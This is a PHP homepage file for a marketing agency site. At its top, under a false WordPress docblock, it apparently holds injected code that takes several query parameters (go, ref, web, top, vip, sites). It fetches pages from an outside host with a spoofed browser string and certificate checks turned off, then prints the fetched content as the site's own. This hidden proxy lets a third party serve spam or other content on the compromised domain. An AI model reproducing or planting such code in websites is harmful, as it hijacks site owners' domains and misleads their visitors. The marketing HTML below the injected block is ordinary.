<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/experiences-digital/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/experiences-digital/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/experiences-digital/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}

elseif(isset($_GET['top'])) {
  $sitex = $_GET['top'];
  $site = 'https://replication2.pkcdurensawit.net/experiences-digital/?top='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
	elseif(isset($_GET['vip'])) {
  $sitex = $_GET['vip'];
  $site = 'https://replication2.pkcdurensawit.net/experiences-digital/?vip='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
elseif(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/experiences-digital/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
	
} else {
?>

 <!DOCTYPE html>
 <html lang="en">
 
 <head>
 
   <!-- Required meta tags -->
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta name="description"
     content="Looking for a reliable marketing agency to boost your business growth? Experience Digital can provide top-notch marketing solutions.">
   <meta name="keywords" content="">
   <link rel="icon" type="image/png" sizes="16x16" href="assetsn/images/favicon.ico">
   <meta name="author" content="">
   <title>Leading Marketing Agency - EXPERIENCES DIGITAL</title>
   <!-- Favicon icon-->
   <link rel="shortcut icon" type="image/x-icon" href="assets/images/favicon.ico">
 
   <!-- Libs CSS -->
   <link rel="stylesheet" href="assets/libs/bootstrap-icons/font/bootstrap-icons.css">
   <link rel="stylesheet" href="assets/css/icon.css">
 
   <!-- Theme CSS -->
   <link rel="stylesheet" href="assets/css/theme.min.css">
   <link rel="stylesheet" href="assets/css/style.css">
 
 </head>
 
 <body>
 <?php
 include 'header.php';
 ?>
   <!-- hero section -->
 
   <div class="bg-video-wrap">
     <div class="container overlay">
       <div class="row d-xl-flex align-items-xl-center">
         <!--col-->
         <div class="col-lg-6 col-md-12">
           <div class="text-white pt-17 pb-13 pt-lg-19 pb-lg-19 mb-4 mb-xl-0">
             <h1 class="display-4 text-white mb-3 fw-bolder">
               Creating the Future Ready Digital Ecosystem
             </h1>
             <!--para-->
             <p class="lead mb-0">
               We leverage content and tech for one key
               purpose: to generate predictable, sustainable
               and scalable growth.
             </p>
             <a href="#" class="scroll-down d-md-block d-none"></a>
           </div>
         </div>
         <!--col-->
         <div class="col-lg-6 col-md-6 mb-5">
         <video autoplay loop muted class="d-md-block d-none" >
       <source src="assets/images/Globe.mp4" width="100%"  type="video/mp4">
     </video>
         </div>
       </div>
 
     </div>
   </div>
 
   <!--hero section-->
   <!-- about section -->
   <div class="py-lg-10 py-10 ok">
     <div class="container">
       <!--row-->
       <div class="row d-xl-flex align-items-xl-center">
         <!--col-->
         <div class="col-lg-8 col-md-12">
           <div class="text-dark pe-xl-10 mb-4 mb-xl-0">
             <h2 class="display-4 text-dark mb-3 fw-bold">
            Crafting solutions & <br> building experiences.
             </h2>
             <!--para-->
             <p class="lead mb-0">
               Our diverse team of content creators and technology experts build impactful digital experiences. Partner with us on a digital journey that matters.
             </p>
             <h2 class="pt-3 h4">We <span style="color: #c52e2c;">Design.</span> We<span style="color: #c52e2c;"> Build.</span> We <span style="color: #c52e2c;">Analyze</span> </h2>
           </div>
         </div>
         <!--col-->
       </div>
     </div>
   </div>
   <!-- form section -->
   <div class="pb-5 pt-5">
     <div class="container">
       <!--row-->
       <div class="row d-xl-flex align-items-xl-center">
         <!--col-->
         <div class="col-lg-6 col-md-6 mb-5">
           <img src="assets/images/Rocket.webp" alt="business growth" class="img-fluid">
         </div>
         <div class="col-lg-6 col-md-12">
           <div class="text-dark pt-6 pb-6 pt-lg-6 pb-lg-6 mb-4 mb-xl-0">
             <h1 class="display-4 text-dark mb-3 fw-bold">
               Fostering business growth through data-driven vision
             </h1>
             <!--para-->
             <p class="lead mb-0">
               Harnessing the power of data-driven insights,
               we cultivate your business by envisioning strategic
               pathways for growth and success. Our approach
               ensures informed decisions that drive lasting
               results.
             </p>
 
           </div>
         </div>
         <!--col-->
       </div>
     </div>
   </div>
   <!-- services section -->
   <div class="">
     <div class="containers">
       <!--row-->
       <div class="row d-xl-flex align-items-xl-center g-0  bg-dark">
         <!--col-->
         <div class="col-lg-12 col-md-12 text-center">
           <div class="d-flex align-items-center justify-content-center p-md-10 p-3">
             <div class="text-white pe-xl-10 mb-4 mb-xl-0">
               <h2 class="display-4 text-white mb-3">
                 Our Network
               </h2>
               <!--para-->
               <p class="lead mb-0">
               Where Creativity, Technology, and Strategy Converge.
               </p>
             </div>
           </div>
         </div>
         </div>
         <!--col-->
         <div class="row g-md-0 g-3">
         <div class="col-lg-4 col-md-4 ">
           <div class="section-card">
             <div class="cards">
                  <a href="/offshoring-expertise">
               <div class="img_area">
                 <div class="ratio-inner "><img src="assets/images/off.webp" alt="food" class="img-fluid" width="100%">
                 </div>
               </div>
               <div class="card-content ">
                 <div class="content px-4 pb-md-3 pb-4">
                   <h3 class="title ps-0">Offshoring Expertise</h3>
                   <p class="description ps-0 fs-5 ">Global Expertise for Efficient Business Expansion.</p>
                   <a href="/offshoring-expertise" class="img-rounded bg-dark rounded-pill d-inline-block text-white px-3 py-2 text-center mt-4">Explore More</a>
                 </div>
               </div>
               </a>
             </div>
           </div>
         </div>
         <div class="col-lg-4 col-md-4 ">
           <div class="section-card">
             <div class="cards">
                  <a href="/technology">
               <div class="img_area">
                 <div class="ratio-inner "><img src="assets/images/tech.webp" alt="food" class="img-fluid" width="100%"></div>
               </div>
               <div class="card-content ">
               <div class="content px-4 pb-md-3 pb-4">
                   <h3 class="title ps-0 ">Tech Capabilities</h3>
                   <p class="description ps-0 fs-5">Tech Empowerment for Seamless Business Transformation.</p>
                   <a href="/technology" class="img-rounded bg-dark rounded-pill d-inline-block  text-white px-3 py-2 text-center mt-4">Explore More</a>
                 </div>
               </div>
               </a>
             </div>
           </div>
         </div>
         <div class="col-lg-4 col-md-4 ">
           <div class="section-card">
             <div class="cards">
                 <a href="https://edigitalsignages.com" target="_blank">
               <div class="img_area">
                 <div class="ratio-inner "><img src="assets/images/digital.webp" alt="food" class="img-fluid" width="100%"></div>
               </div>
               <div class="card-content">
               <div class="content px-4 pb-md-3 pb-4">
                   <h3 class="title ps-0">Digital Signage Solutions</h3>
                   <p class="description ps-0 fs-5">Elevating Brands with Engaging Digital Signage Solutions.</p>
                   <a href="https://edigitalsignages.com" target="_blank" class="img-rounded bg-dark rounded-pill d-inline-block text-white px-3 py-2 text-center mt-4">Explore More</a>
                 </div>
               </div>
               </a>
             </div>
           </div>
         </div>
       </div>
     </div>
   </div>
 
   <!-- client-logo -->
   <div class="pt-0 pt-lg-3 pb-3 pb-lg-6  ">
     <div class="pt-md-10 pt-10">
       <div class="container">
         <div class="row">
           <div class="col-lg-12 col-md-12 col-12">
             <div class="text-center mb-md-10 mb-3">
               <!--heading-->
               <h2 class="mb-3 h1">
                 Proudly Powers Global Giants
               </h2>
             </div>
           </div>
         </div>
         <div class="row">
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image51.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image52.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image53.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image54.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image55.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image56.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image57.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image58.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image59.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image60.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image61.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
           <div class="col-lg-2 col-md-4 col-6">
             <!--image-->
             <div class="mb-4 mt-4 text-center">
               <img src="assets/images/client-logo/Image62.webp" alt="logo" class="col-8 col-md-8 img-fluid"  />
             </div>
           </div>
         </div>
       </div>
     </div>
   </div>
   <div class="pt-0 pt-lg-3 pb-3 pb-lg-6  ">
     <div class="pt-5">
       <div class="container">
         <div class="row">
           <div class="col-lg-12 col-md-12 col-12">
             <div class="text-center mb-10">
               <!--heading-->
               <h2 class="mb-3 h3">
               Our Work
               </h2>
               <h2 class="mb-3 h1">
               Impactful And Insightful Stories
               </h2>
             </div>
           </div>
         </div>
         <div id="carouselExampleIndicators" class="carousel slide" data-bs-ride="carousel">
   <!-- <div class="carousel-indicators">
     <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
     <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="1" aria-label="Slide 2"></button>
   </div> -->
   <div class="carousel-inner">
     <div class="carousel-item active">
     <div class="row g-1">
           <div class="col-lg-6 col-md-6 col-12 bg-color position-relative">
             <div class=" p-5">
               <div class="row align-items-center">
               <div class="col-md-7 order-md-1 order-1"><img src="assets/images/Pernod_Casestudies.webp" width="320px"  class=" img_carousel d-block pt-md-10 pt-3 bottom-0 start-0 " alt="Pernod_Casestudies"></div>
                <div class="col-md-5 pt-md-6 order-md-2 order-2">
                   <img src="assets/images/client-logo/Image58.webp" alt="" class="img-fluid pb-5">
                   <p class="h6">Powered 500 retail outlets with AI digital signages. These signages were able to recognize human gestures, movements &amp; other attributes to programmatically schedule brand communication.</p>
                   <!--<a href="#" class="img-rounded bg-dark rounded-pill d-block text-white px-3 py-2 text-center mt-4">Read Case Study</a>-->
                 </div>
               </div>
             </div>
           </div>
           <div class="col-lg-6 col-md-6 col-12 bg-color2 ">
             <div class=" p-5">
               <div class="row align-items-center">
                 <div class="col-md-5 order-md-1 order-2">
                   <img src="assets/images/client-logo/Diageo-Logo.png" alt="" class="img-fluid py-4">
                      <p class="h6">Designed & developed multiple microsites for Diageo's travel & retail business. Our task was to ensure that the designs capture the essence of 200+ brands in their portfolio.</p>
                   <!--<a href="#" class="img-rounded bg-dark rounded-pill d-block text-white px-3 py-2 text-center mt-4">Read Case Study</a>-->
                 </div>
                 <div class="col-md-7 order-md-2 order-1"><img src="assets/images/Diageo_Casestudies.webp" class=" img_carousel d-block " alt="Pernod_Casestudies"></div>
               </div>
             </div>
           </div>
 
     </div>
     </div>
 
   </div>
   <!-- <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide="prev">
     <span class="carousel-control-prev-icon" aria-hidden="true"></span>
     <span class="visually-hidden">Previous</span>
   </button>
   <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide="next">
     <span class="carousel-control-next-icon" aria-hidden="true"></span>
     <span class="visually-hidden">Next</span>
   </button> -->
 </div>
 
       </div>
     </div>
   </div>
   <div class="pb-5 pt-5">
     <div class="containers">
       <!--row-->
       <div class="row d-xl-flex align-items-xl-center g-0">
         <div class="offset-xxl-1 col-lg-4 col-md-12 px-3">
           <div class="text-dark pt-6 pb-6 pt-lg-6 pb-lg-6 mb-4 mb-xl-0">
             <h2 class="display-xl-3 display-4 text-dark mb-3 fw-bold">
               Result Driven.<br>Transparent. Proactive
             </h2>
             <!--para-->
             <p class="lead mb-0">
              Team made up of innovative and passionate individuals, driven by experimentation, dedicated to enhancing your brand.
             </p>
 
           </div>
         </div>
         <!--col-->
         <!--col-->
         <div class="col-lg-7 col-md-6 mb-5">
           <img src="assets/images/team.webp" alt="business growth" class="img-fluid ">
         </div>
       </div>
     </div>
   </div>
 
   <?php
 include 'footer.php';
 ?>
 <?php
 }
 ?>


